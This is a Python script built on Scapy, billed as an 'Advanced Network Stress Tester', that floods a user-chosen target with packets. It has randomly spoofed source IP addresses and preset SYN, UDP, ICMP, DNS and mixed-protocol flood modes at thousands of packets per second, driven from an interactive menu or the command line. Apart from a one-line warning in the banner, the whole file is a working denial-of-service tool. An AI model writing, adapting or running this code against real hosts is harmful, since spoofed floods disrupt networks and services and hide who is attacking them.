#!/usr/bin/env python3
import sys
import random
import time
import argparse
import logging
import socket
import signal
import os
from threading import Thread, Lock, Event
try:
    from scapy.all import *
except ImportError:
    print("Scapy is not installed. Install it with 'pip install scapy'.")
    sys.exit(1)

class AdvancedNetworkTester:
    def __init__(self):
        self.running = Event()
        self.running.set()  # Initially running
        self.threads = []
        self.lock = Lock()
        self.sent_packets = 0
        self.test_start_time = 0
        self.current_test = None
        self.verbose = False
        self.packet_interval = 0.001  # Default 1ms between packets
        self.timeout = 10  # Default test duration in seconds
        
        # Pre-define common ports
        self.common_ports = {
            'http': 80,
            'https': 443,
            'dns': 53,
            'ftp': 21,
            'ssh': 22,
            'smtp': 25
        }
        
        # Setup logging
        logging.basicConfig(
            filename='network_tester.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger()

    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.stop_test()
        print("\nTest stopped by user")
        self.logger.info("Test stopped by user")
        sys.exit(0)

    def clear_screen(self):
        """Cross-platform screen clearing"""
        print("\033[H\033[J", end="")

    def show_banner(self):
        """Display program banner with ethical warning"""
        self.clear_screen()
        print("""
 ▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ 
▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒
░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ 
              
░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░
 ░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░
   ░       ░  ░     ░  ░   ░               ░  ░  ░
 ░      
     Advanced Network Stress Tester (Scapy)
     WARNING: Use only on networks you own or have explicit permission to test.
     Unauthorized use may be illegal and unethical.
""")

    def validate_ip(self, target):
        """Validate IP address or hostname"""
        try:
            socket.inet_aton(target)  # Check if valid IP
            return True
        except socket.error:
            try:
                socket.gethostbyname(target)  # Check if resolvable hostname
                return True
            except socket.gaierror:
                return False

    def generate_random_ip(self):
        """Efficient random IP generation"""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def create_packet(self, target_ip, target_port, protocol="tcp", payload_size=64):
        """Create optimized network packets with various options"""
        src_ip = self.generate_random_ip()
        src_port = random.randint(1024, 65535)
        
        ip_layer = IP(src=src_ip, dst=target_ip, id=random.randint(1, 65535))
        
        if protocol.lower() == "tcp":
            transport = TCP(sport=src_port, dport=target_port,
                          seq=random.randint(0, 4294967295),
                          flags="S", window=random.randint(1024, 65535))
        elif protocol.lower() == "udp":
            transport = UDP(sport=src_port, dport=target_port)
        elif protocol.lower() == "icmp":
            transport = ICMP(type=8, code=0)
        elif protocol.lower() == "dns":
            transport = UDP(sport=src_port, dport=target_port)/DNS(qd=DNSQR(qname=f"test{random.randint(1, 1000)}.com"))
        else:
            transport = Raw(load="X"*payload_size)
        
        if payload_size > 0:
            payload = Raw(load=bytes(random.getrandbits(8) for _ in range(payload_size)))
            return ip_layer/transport/payload
        return ip_layer/transport

    def send_traffic(self, target_ip, target_port, protocol, duration, rate, payload_size):
        """Efficient traffic generation with token bucket rate control"""
        tokens = rate  # Initial tokens
        token_rate = rate  # Tokens per second
        last_time = time.time()
        start_time = time.time()
        packet = self.create_packet(target_ip, target_port, protocol, payload_size)
        
        while self.running.is_set() and (time.time() - start_time < duration):
            current_time = time.time()
            elapsed = current_time - last_time
            tokens += elapsed * token_rate  # Add tokens based on elapsed time
            tokens = min(tokens, rate)  # Cap tokens at rate
            last_time = current_time
            
            if tokens >= 1:
                try:
                    send(packet, verbose=False)
                    with self.lock:
                        self.sent_packets += 1
                    tokens -= 1
                except Exception as e:
                    self.logger.error(f"Packet sending error: {e}")
            else:
                time.sleep(0.001)  # Wait for more tokens

    def start_test(self, target_ip, target_port=None, protocol="tcp", 
                  duration=10, rate=100, threads=3, payload_size=64):
        """Start a controlled stress test"""
        if not self.validate_ip(target_ip):
            print(f"Invalid target IP/hostname: {target_ip}")
            self.logger.error(f"Invalid target IP/hostname: {target_ip}")
            return
            
        if not target_port:
            target_port = self.common_ports.get(protocol, 80)
            
        self.running.set()
        self.sent_packets = 0
        self.test_start_time = time.time()
        self.current_test = {
            'target': target_ip,
            'port': target_port,
            'protocol': protocol,
            'start_time': self.test_start_time
        }
        
        print(f"\nStarting {protocol.upper()} test to {target_ip}:{target_port}")
        print(f"Duration: {duration}s | Rate: {rate} pps | Threads: {threads}")
        print(f"Payload size: {payload_size} bytes\n")
        self.logger.info(f"Starting {protocol.upper()} test to {target_ip}:{target_port}, "
                        f"Duration: {duration}s, Rate: {rate} pps, Threads: {threads}, "
                        f"Payload size: {payload_size} bytes")
        
        monitor_thread = Thread(target=self.monitor_test)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        for _ in range(threads):
            thread = Thread(
                target=self.send_traffic,
                args=(target_ip, target_port, protocol, duration, rate/threads, payload_size)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        time.sleep(duration)
        self.stop_test()
        
        test_duration = time.time() - self.test_start_time
        if test_duration > 0:
            avg_rate = self.sent_packets / test_duration
            print(f"\nTest completed. Sent {self.sent_packets} packets")
            print(f"Average rate: {avg_rate:.1f} packets/second")
            print(f"Total duration: {test_duration:.2f} seconds")
            self.logger.info(f"Test completed. Sent {self.sent_packets} packets, "
                           f"Average rate: {avg_rate:.1f} pps, Duration: {test_duration:.2f}s")

    def monitor_test(self):
        """Monitor test progress with minimal overhead"""
        while self.running.is_set():
            elapsed = time.time() - self.test_start_time
            if elapsed > 0:
                with self.lock:
                    current_count = self.sent_packets
                rate = current_count / elapsed
                print(f"\rPackets: {current_count} | Rate: {rate:.1f} pps | Elapsed: {elapsed:.1f}s", end="")
                self.logger.info(f"Progress: Packets: {current_count}, Rate: {rate:.1f} pps, Elapsed: {elapsed:.1f}s")
            time.sleep(1)  # Reduced frequency for lower overhead

    def stop_test(self):
        """Stop all test activities"""
        if self.running.is_set():
            self.running.clear()
            for thread in self.threads:
                if thread.is_alive():
                    thread.join()
            self.threads.clear()
            self.logger.info("All test threads stopped")

    def run_advanced_test(self, test_type, target):
        """Predefined test scenarios"""
        tests = {
            'syn-flood': {'protocol': 'tcp', 'rate': 5000, 'duration': 60, 'payload_size': 64},
            'udp-flood': {'protocol': 'udp', 'rate': 2000, 'duration': 60, 'payload_size': 1024},
            'icmp-flood': {'protocol': 'icmp', 'rate': 1000, 'duration': 60, 'payload_size': 128},
            'http-load': {'protocol': 'tcp', 'port': 80, 'rate': 1000, 'duration': 120, 'payload_size': 256},
            'dns-test': {'protocol': 'dns', 'port': 53, 'rate': 500, 'duration': 60, 'payload_size': 64},
            'mixed-flood': {'protocol': 'mixed', 'rate': 3000, 'duration': 60, 'payload_size': 512}
        }
        
        if test_type not in tests:
            print(f"Unknown test type: {test_type}")
            self.logger.error(f"Unknown test type: {test_type}")
            return
            
        params = tests[test_type]
        if params['protocol'] == 'mixed':
            self.start_mixed_test(target, **params)
        else:
            print(f"\nRunning {test_type} test against {target}")
            self.start_test(target, **params)

    def start_mixed_test(self, target_ip, rate, duration, payload_size, threads=3):
        """Run a mixed protocol test (TCP, UDP, ICMP)"""
        protocols = ['tcp', 'udp', 'icmp']
        per_protocol_rate = rate / len(protocols)
        
        self.running.set()
        self.sent_packets = 0
        self.test_start_time = time.time()
        self.current_test = {
            'target': target_ip,
            'protocol': 'mixed',
            'start_time': self.test_start_time
        }
        
        print(f"\nStarting mixed protocol test to {target_ip}")
        print(f"Duration: {duration}s | Rate: {rate} pps | Threads: {threads}")
        print(f"Payload size: {payload_size} bytes\n")
        self.logger.info(f"Starting mixed test to {target_ip}, Duration: {duration}s, "
                        f"Rate: {rate} pps, Threads: {threads}, Payload size: {payload_size} bytes")
        
        monitor_thread = Thread(target=self.monitor_test)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        for protocol in protocols:
            for _ in range(threads):
                thread = Thread(
                    target=self.send_traffic,
                    args=(target_ip, self.common_ports.get(protocol, 80), protocol,
                          duration, per_protocol_rate/threads, payload_size)
                )
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
        
        time.sleep(duration)
        self.stop_test()
        
        test_duration = time.time() - self.test_start_time
        if test_duration > 0:
            avg_rate = self.sent_packets / test_duration
            print(f"\nTest completed. Sent {self.sent_packets} packets")
            print(f"Average rate: {avg_rate:.1f} packets/second")
            print(f"Total duration: {test_duration:.2f} seconds")
            self.logger.info(f"Mixed test completed. Sent {self.sent_packets} packets, "
                           f"Average rate: {avg_rate:.1f} pps, Duration: {test_duration:.2f}s")

    def interactive_menu(self):
        """User-friendly interactive interface"""
        signal.signal(signal.SIGINT, self.signal_handler)
        
        while True:
            self.show_banner()
            print("\nMain Menu:")
            print("1. Quick Test (Basic Parameters)")
            print("2. Advanced Test (Predefined Scenarios)")
            print("3. Custom Test (Full Control)")
            print("4. Stop Current Test")
            print("5. Exit")
            
            try:
                choice = input("\nSelect option: ").strip()
                
                if choice == "1":
                    self.run_quick_test()
                elif choice == "2":
                    self.run_advanced_menu()
                elif choice == "3":
                    self.run_custom_test()
                elif choice == "4":
                    self.stop_test()
                    print("Test stopped")
                    self.logger.info("Test stopped via menu")
                    time.sleep(1)
                elif choice == "5":
                    self.stop_test()
                    print("Exiting...")
                    self.logger.info("Program exited")
                    break
                else:
                    print("Invalid choice")
                    time.sleep(1)
            except Exception as e:
                print(f"Error: {e}")
                self.logger.error(f"Menu error: {e}")
                time.sleep(2)

    def run_quick_test(self):
        """Simplified test configuration"""
        self.show_banner()
        print("\nQuick Test Configuration:")
        
        while True:
            target = input("Target IP/hostname: ").strip()
            if self.validate_ip(target):
                break
            print("Invalid IP/hostname. Please try again.")
        
        protocol = input("Protocol (tcp/udp/icmp) [tcp]: ").strip().lower() or "tcp"
        if protocol not in ['tcp', 'udp', 'icmp']:
            print("Invalid protocol. Using TCP.")
            protocol = "tcp"
        
        while True:
            try:
                duration = int(input("Duration (seconds) [10]: ").strip() or "10")
                if duration > 0:
                    break
                print("Duration must be positive.")
            except ValueError:
                print("Invalid duration. Please enter a number.")
        
        self.start_test(target, protocol=protocol, duration=duration)
        input("\nPress Enter to continue...")

    def run_advanced_menu(self):
        """Menu for predefined test scenarios"""
        self.show_banner()
        print("\nAdvanced Test Scenarios:")
        print("1. SYN Flood (TCP)")
        print("2. UDP Flood")
        print("3. ICMP Flood (Ping)")
        print("4. HTTP Load Test")
        print("5. DNS Stress Test")
        print("6. Mixed Protocol Flood")
        print("7. Back to Main Menu")
        
        choice = input("\nSelect test type: ").strip()
        if choice == "7":
            return
            
        test_types = ['syn-flood', 'udp-flood', 'icmp-flood', 'http-load', 'dns-test', 'mixed-flood']
        try:
            test_idx = int(choice) - 1
            if 0 <= test_idx < len(test_types):
                while True:
                    target = input("Target IP/hostname: ").strip()
                    if self.validate_ip(target):
                        break
                    print("Invalid IP/hostname. Please try again.")
                self.run_advanced_test(test_types[test_idx], target)
                input("\nPress Enter to continue...")
        except ValueError:
            print("Invalid choice")
            self.logger.error("Invalid choice in advanced menu")
            time.sleep(1)

    def run_custom_test(self):
        """Full custom test configuration"""
        self.show_banner()
        print("\nCustom Test Configuration:")
        
        while True:
            target = input("Target IP/hostname: ").strip()
            if self.validate_ip(target):
                break
            print("Invalid IP/hostname. Please try again.")
        
        protocol = input("Protocol (tcp/udp/icmp/dns/raw) [tcp]: ").strip().lower() or "tcp"
        if protocol not in ['tcp', 'udp', 'icmp', 'dns', 'raw']:
            print("Invalid protocol. Using TCP.")
            protocol = "tcp"
        
        port = None
        if protocol != 'raw' and protocol != 'icmp':
            while True:
                port_input = input(f"Target port [{'auto' if protocol != 'raw' else 'N/A'}]: ").strip()
                if not port_input and protocol != 'raw':
                    port = self.common_ports.get(protocol, 80)
                    break
                try:
                    port = int(port_input)
                    if 1 <= port <= 65535:
                        break
                    print("Port must be between 1 and 65535.")
                except ValueError:
                    print("Invalid port. Please enter a number or leave blank for auto.")
        
        while True:
            try:
                duration = int(input("Duration (seconds) [30]: ").strip() or "30")
                if duration > 0:
                    break
                print("Duration must be positive.")
            except ValueError:
                print("Invalid duration. Please enter a number.")
        
        while True:
            try:
                rate = int(input("Packets per second [100]: ").strip() or "100")
                if rate > 0:
                    break
                print("Rate must be positive.")
            except ValueError:
                print("Invalid rate. Please enter a number.")
        
        while True:
            try:
                threads = int(input("Threads [3]: ").strip() or "3")
                if threads > 0:
                    break
                print("Threads must be positive.")
            except ValueError:
                print("Invalid threads. Please enter a number.")
        
        while True:
            try:
                payload_size = int(input("Payload size (bytes) [64]: ").strip() or "64")
                if payload_size >= 0:
                    break
                print("Payload size must be non-negative.")
            except ValueError:
                print("Invalid payload size. Please enter a number.")
        
        self.start_test(
            target,
            target_port=port,
            protocol=protocol,
            duration=duration,
            rate=rate,
            threads=threads,
            payload_size=payload_size
        )
        input("\nPress Enter to continue...")

def main():
    if os.geteuid() != 0:
        print("This tool requires root privileges. Run with 'sudo' (e.g., 'sudo python3 network_tester.py').")
        sys.exit(1)
        
    tester = AdvancedNetworkTester()
    
    parser = argparse.ArgumentParser(description="Advanced Network Stress Tester")
    parser.add_argument("target", nargs="?", help="Target IP/hostname")
    parser.add_argument("-p", "--port", type=int, help="Target port")
    parser.add_argument("-t", "--protocol", choices=["tcp", "udp", "icmp", "dns", "raw"], 
                       default="tcp", help="Protocol to use")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Test duration in seconds")
    parser.add_argument("-r", "--rate", type=int, default=100, help="Packets per second")
    parser.add_argument("-n", "--threads", type=int, default=3, help="Number of threads")
    parser.add_argument("-s", "--size", type=int, default=64, help="Payload size in bytes")
    parser.add_argument("-a", "--advanced", choices=["syn-flood", "udp-flood", "icmp-flood", 
                       "http-load", "dns-test", "mixed-flood"], help="Run predefined test scenario")
    
    args = parser.parse_args()
    
    if args.advanced and args.target:
        tester.run_advanced_test(args.advanced, args.target)
    elif args.target:
        tester.start_test(
            args.target,
            target_port=args.port,
            protocol=args.protocol,
            duration=args.duration,
            rate=args.rate,
            threads=args.threads,
            payload_size=args.size
        )
    else:
        tester.interactive_menu()

if __name__ == "__main__":
    main()